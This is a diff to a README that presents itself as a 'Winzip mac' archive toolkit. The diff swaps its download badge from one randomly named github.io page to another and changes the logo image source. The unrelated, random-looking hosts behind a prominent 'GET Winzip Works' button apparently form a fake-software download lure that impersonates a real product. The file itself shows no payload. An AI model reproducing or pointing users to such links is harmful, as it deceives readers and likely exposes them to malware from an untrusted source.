@@ -2,7 +2,8 @@
 
 Winzip mac on macOS — toolkit focused on zip/zipx/7z/rar, plus strong aes encryption and split archives with native integrations and Apple silicon per
 
-[![Download Winzip mac](https://img.shields.io/badge/Download-Winzip_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![GET Winzip Works](https://img.shields.io/badge/GET%20%E2%80%94%20Winzip-Works-0078D6?style=for-the-badge&logoColor=white)](https://polowywestpetruccelli.github.io/.github/WinzipWorks)
+
 
 ---
 
@@ -65,7 +66,7 @@ Winzip mac on macOS — toolkit focused on zip/zipx/7z/rar, plus strong aes encr
 ### 🖼 Preview
 
 **1. Winzip mac Logo**  
-![Winzip mac Logo](https://logo.clearbit.com/winzip.com)  
+![Winzip mac Logo](https://m.media-amazon.com/images/I/618mROwfjXL.jpg_BO30,255,255,255_UF750,750_SR1910,1000,0,C_QL100_.jpg)  
 *A recognizable logo for Winzip mac used for quick identification in docs and listings.*
 
 ---
